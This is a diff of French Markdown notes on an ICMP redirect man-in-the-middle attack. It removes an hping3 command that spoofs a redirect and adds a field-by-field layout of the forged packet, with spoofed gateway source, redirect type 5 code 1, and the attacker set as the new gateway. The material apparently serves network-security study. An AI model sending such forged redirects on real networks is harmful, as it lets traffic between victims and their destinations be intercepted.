@@ -488,15 +488,27 @@ sur une interface précise. Et la plus importante partie vient du fait qu'ils on
 requêtes ICMP depuis `icmp.c` mais en les traitant avec les outils permettant de gérér la couche au dessus,  
 c'est à dire depuis la couche 4 avec tcp ou udp par exemple. (`tcp_ipv4.c` | `udp_ipv4.c`)
 
-### Rappels pratiques
-```bash
-hping3 -I <iface> -C 5 -K 1 -c <count> \
-    -a <current_gw> \
-    --icmp-ipdst <target> \
-    --icmp-gw <attacker> \
-    --icmp-ipsrc <victim> \
-    <victim>
-```
+### Résumé de l'Attaque ICMP Redirect
+Pour réussir l'attaque Lady In The Middle, un paquet avec 4 parties différentes est envoyé :
+
+**IP()**
+- ip.src = ip_gw
+- ip.dst = ip_victim
+
+**ICMP()**
+- icmp.type = 5
+- icmp.code = 1
+- icmp.gw = ip_attacker
+
+**IP()**
+- ip2.src = ip_victim
+- ip2.dst = ip_targetroute
+
+**ICMP()**
+icmp2.type = 0
+icmp2.code = 0
+
+
 
 ## Commandes utiles
 
